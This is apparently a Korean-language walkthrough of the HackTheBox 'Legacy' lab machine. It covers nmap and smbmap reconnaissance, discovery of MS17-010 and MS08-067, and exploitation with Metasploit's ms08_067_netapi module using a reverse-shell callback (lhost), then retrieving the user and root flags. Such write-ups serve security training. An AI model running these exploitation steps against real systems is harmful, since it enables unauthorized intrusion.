# Legacy - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,445 -sC -sV -vv -oA Legacy 10.10.10.4
```
<img width="998" height="121" alt="image" src="https://github.com/user-attachments/assets/8bb551b8-b845-44b7-b5d4-cb17be5652e1" />

- SMB(445)

---
## SMB
- `smbmap`을 사용하여 guest 로그인 시도하였으나 실패.
```bash
smbmap -u '' -p '' -H 10.10.10.4

smbmap -u 'guest' -p '' -H 10.10.10.4
```

<br>

- `nmap`의 `--script=vuln`옵션을 사용.
- `MS17-010`과 `MS08-067`취약점 발견됨.
<img width="1050" height="519" alt="image" src="https://github.com/user-attachments/assets/31143141-7613-4beb-b1f3-63fb62652306" />

---
## MS08-067
- `metasploit`의 `ms08_067_netapi` 모듈을 사용.
```
set rhosts 10.10.10.4

set lhost 10.10.16.3

run
```
<img width="1104" height="280" alt="image" src="https://github.com/user-attachments/assets/29352842-7671-40c6-ae19-41ec1d210ca3" />

<br>
<br>

- shell 획득
- `whoami`명령어가 잘 작동하지 않지만, 탐색은 가능.
```
shell
```
<img width="1104" height="205" alt="image" src="https://github.com/user-attachments/assets/bafa092e-a55f-4239-b2b8-c3a072f03d73" />

---
## FLAG
- `c:\documents and settings\john\desktop\user.txt`
<img width="1104" height="245" alt="image" src="https://github.com/user-attachments/assets/5dab195c-c115-4643-98b4-c4f289b9a5b9" />

<br>
<br>

- `c:\documents and settings\administrator\desktop\root.txt`
<img width="1104" height="245" alt="image" src="https://github.com/user-attachments/assets/de26bb46-948f-4e3e-ba9e-9d0de9bc3706" />





